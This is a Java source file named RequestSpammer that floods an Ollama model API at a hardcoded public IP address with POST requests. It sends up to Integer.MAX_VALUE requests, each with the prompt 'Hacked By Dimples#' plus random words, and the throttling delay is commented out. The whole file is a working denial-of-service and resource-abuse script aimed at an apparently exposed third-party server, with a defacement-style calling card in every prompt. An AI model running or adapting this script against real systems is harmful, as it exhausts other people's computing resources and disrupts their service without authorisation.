// Thanks: Deepseek-R1:14b
package net.deepseek;

import cn.a114.utils.SoutUtils;
import com.google.gson.*;
import com.google.gson.stream.JsonWriter;
import jdk.nashorn.internal.parser.JSONParser;
import sun.font.SunFontManager;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class RequestSpammer {

    public static InputStream WORDS_TXT_STREAM = RequestSpammer.class.getResourceAsStream("/words.txt");

    public static final String BASE_URL = "http://183.6.26.100:11434/api/generate"; // Replace with your Ollama API endpoint
    private static final int NUM_REQUESTS = Integer.MAX_VALUE; // Number of requests to send
    private static final String MODEL_NAME = "deepseek-r1:14b";

    public static void main(String[] args) {
        SoutUtils.out("RequestSpammer is running");
        try {
            for (int i = 0; i < NUM_REQUESTS; i++) {
                String prompt = "Hacked By Dimples#" + i; // Replace with your prompt

                String _randomWords = randomWords(new Random().nextInt(8), true, WORDS_TXT_STREAM);

                boolean isUnsafe = true;

                try {
                    sendRequest(prompt, _randomWords, isUnsafe);
                    SoutUtils.out("Try to Spam");
                } catch (OutOfMemoryError e) {
                    SoutUtils.out(e.getClass().getCanonicalName());
                    System.gc();
                }


            }
            // Use a thread pool to execute the requests concurrently
        } catch (Throwable e) {
            SoutUtils.out("Error: " + e.getMessage());
        }
    }

    public static synchronized String randomWords(int WordCount, boolean shouldSpace, InputStream iStream) throws IOException {

        String s;
        String words = "";
        for (int i = 0; i <= WordCount; i++) {
            s = readWordsFromStream(new Random().nextInt(466550), iStream);
            words += (s + (shouldSpace ? " " : ""));
        }
        return words;

    }

    public static String readWordsFromStream(int line, InputStream stream) throws IOException {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream));

        String words;
        synchronized ("") {
            for (int i = 0; i <= line; i++) {
                bufferedReader.readLine();
            }
        }
        words = bufferedReader.readLine();
        return words;
    }

    public static String prettyPrintUsingGson(String uglyJson) {
        Gson gson = new GsonBuilder().setPrettyPrinting().create();

        JsonElement jsonElement = JsonParser.parseString(uglyJson);
        String prettyJsonString = gson.toJson(jsonElement);
        return prettyJsonString;
    }

    private static synchronized void sendRequest(String prompt, String message, boolean isUnsafe) {
        try {
            // Create the request body


            JsonObject jobj = new JsonObject();



            jobj.addProperty("model", MODEL_NAME);
            jobj.addProperty("prompt", prompt);
            jobj.addProperty("message", message);
            jobj.addProperty("is_unsafe", isUnsafe);

            URL url = new URL(BASE_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();

            // Set headers
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Write the request body
            OutputStream requestOutputStream = /*CONNECTION OUTPUTSTREAM*/connection.getOutputStream();
            requestOutputStream.write(jobj.toString().getBytes(StandardCharsets.UTF_8));
            requestOutputStream.flush();


            // Add a small delay to prevent overwhelming the server
            // Thread.sleep(1000L);

            // Get response
            int statusCode = connection.getResponseCode();
            SoutUtils.out("Status Code: " + statusCode);
            InputStream istream;
            try {
                istream = connection.getInputStream();
            } catch (IOException e) {
                SoutUtils.out("Variable istream failed to initialization, return;");
                return;
            }

//            String f = "";
//            synchronized (BASE_URL) {
//                BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//                String is;
//                while ((is = br.readLine()) != null) {
//                    f += is+",";
//                }
//            }
//
//            String temp0 = "["+f+"]";
//
//
//            SoutUtils.logger.info(prettyPrintUsingGson(temp0));

//            SoutUtils.out("Response: " + prettyPrintUsingGson(temp0));



        } catch (Exception e) {
            synchronized ("") {
                e.printStackTrace();
            }
        }
    }
}
